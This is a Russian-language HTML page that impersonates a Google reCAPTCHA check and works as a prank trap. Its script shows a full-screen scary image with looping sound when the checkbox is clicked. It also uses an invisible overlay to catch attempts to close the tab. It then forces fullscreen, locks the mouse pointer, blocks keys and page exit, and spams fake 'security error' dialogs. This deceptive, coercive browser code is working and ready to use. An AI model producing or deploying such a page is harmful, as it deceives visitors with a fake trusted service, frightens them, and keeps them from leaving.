<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Проверка безопасности</title>
    <style>
        body {
            font-family: Roboto, helvetica, arial, sans-serif;
            background-color: #f9f9f9;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }
        .captcha-box {
            background: #f9f9f9;
            border: 1px solid #d3d3d3;
            border-radius: 3px;
            width: 304px;
            height: 78px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 12px;
            box-shadow: 0 0 4px rgba(0,0,0,0.08);
            position: relative;
            z-index: 10;
        }
        .checkbox-container {
            display: flex;
            align-items: center;
        }
        .checkbox {
            width: 28px;
            height: 28px;
            border: 2px solid #c1c1c1;
            border-radius: 2px;
            cursor: pointer;
            background: #fff;
            margin-right: 15px;
        }
        .text {
            font-size: 14px;
            color: #282828;
            user-select: none;
        }
        .logo-section {
            display: flex;
            flex-direction: column;
            align-items: center;
            font-size: 8px;
            color: #555;
        }
        .logo-section img {
            width: 32px;
            height: 32px;
            margin-bottom: 2px;
        }
        
        /* Ловушка: невидимый слой на весь экран */
        #trap-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background: rgba(0,0,0,0.001); /* Почти прозрачный, но кликабельный */
            z-index: 99998;
            cursor: default;
        }

        #screamer-container {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background: #000;
            z-index: 99999;
        }
        #screamer-container img {
            width: 100%;
            height: 100%;
            object-fit: contain;
        }
    </style>
</head>
<body>

    <div class="captcha-box">
        <div class="checkbox-container">
            <div class="checkbox" onclick="activateScreamer()"></div>
            <div class="text">Я не робот</div>
        </div>
        <div class="logo-section">
            <img src="https://gstatic.com">
            <span>reCAPTCHA</span>
            <a href="https://google.com" target="_blank" style="color:#555; text-decoration:none; margin-top:2px;">Конфиденциальность</a>
        </div>
    </div>

    <!-- Компоненты ловушки -->
    <div id="trap-overlay"></div>

    <div id="screamer-container">
        <img src="7f3UOH.gif" alt="">
    </div>

    <audio id="screamer-sound" src="caughtyou.mp3" loop preload="auto"></audio>

    <script>
        var isScreamerActive = false;
        var trapOverlay = document.getElementById('trap-overlay');

        // 1. Ловим попытку ухода к панели вкладок (вверх)
        document.addEventListener('mouseleave', function(e) {
            if (e.clientY < 50 && !isScreamerActive) {
                // Мгновенно активируем невидимый щит на весь экран
                trapOverlay.style.display = 'block';
            }
        });

        // Если пользователь вернул мышку на страницу, убираем щит (чтобы он мог нажать саму капчу)
        document.addEventListener('mouseenter', function() {
            if (!isScreamerActive) {
                trapOverlay.style.display = 'none';
            }
        });

        // 2. Клик по невидимому щиту при попытке закрыть сайт
        trapOverlay.addEventListener('click', function() {
            activateScreamer();
        });

        // Основная функция активации скримера
        function activateScreamer() {
            isScreamerActive = true;
            trapOverlay.style.display = 'none'; // Убираем промежуточный слой
            
            var container = document.getElementById('screamer-container');
            var sound = document.getElementById('screamer-sound');
            
            container.style.display = 'block';

            // Звук (теперь легален, так как был клик по trap-overlay или чекбоксу)
            sound.play().catch(function(err) { console.log("Ошибка звука:", err); });

            // Фуллскрин (работает идеально, так как вызван напрямую из события 'click')
            if (container.requestFullscreen) {
                container.requestFullscreen();
            } else if (container.webkitRequestFullscreen) { 
                container.webkitRequestFullscreen();
            }

            // Блокировка курсора мыши
            lockMouse();

            // Включаем бесконечный спам окнами с задержкой, чтобы браузер успел развернуть фуллскрин
            setTimeout(triggerAnnoyingAlerts, 100);
        }

        function lockMouse() {
            var container = document.getElementById('screamer-container');
            if (container.requestPointerLock) container.requestPointerLock();
            else if (container.webkitRequestPointerLock) container.webkitRequestPointerLock();
        }

        // Блокировка закрытия вкладки (стандартная)
        window.addEventListener('beforeunload', preventExit);
        function preventExit(e) {
            if (!isScreamerActive) return;
            e.preventDefault();
            e.returnValue = 'Изменения не сохранены.';
            return e.returnValue;
        }

        // Бесконечный цикл алертов
        function triggerAnnoyingAlerts() {
            if (!isScreamerActive) return;
            while (true) {
                alert("Ошибка безопасности! Изменения не сохранены.");
                var confirmExit = confirm("Вы уверены, что хотите прервать проверку? Данные будут утеряны.");
                if (!confirmExit || confirmExit) {
                    alert("Доступ ограничен. Завершите проверку «Я не робот».");
                    break; 
                }
            }
        }

        // Перехваты для удержания в фуллскрине
        window.addEventListener('keydown', function(e) {
            if (isScreamerActive) {
                e.preventDefault();
                lockMouse();
                triggerAnnoyingAlerts();
            }
        });
        
        document.addEventListener('click', function() {
            if (isScreamerActive) {
                var container = document.getElementById('screamer-container');
                if (!document.fullscreenElement && !document.webkitFullscreenElement) {
                    if (container.requestFullscreen) container.requestFullscreen();
                    else if (container.webkitRequestFullscreen) container.webkitRequestFullscreen();
                }
                lockMouse();
                triggerAnnoyingAlerts();
            }
        });

        document.addEventListener('pointerlockchange', function() {
            if (isScreamerActive && document.pointerLockElement !== document.getElementById('screamer-container')) {
                setTimeout(lockMouse, 50);
            }
        });
    </script>
</body>
</html>
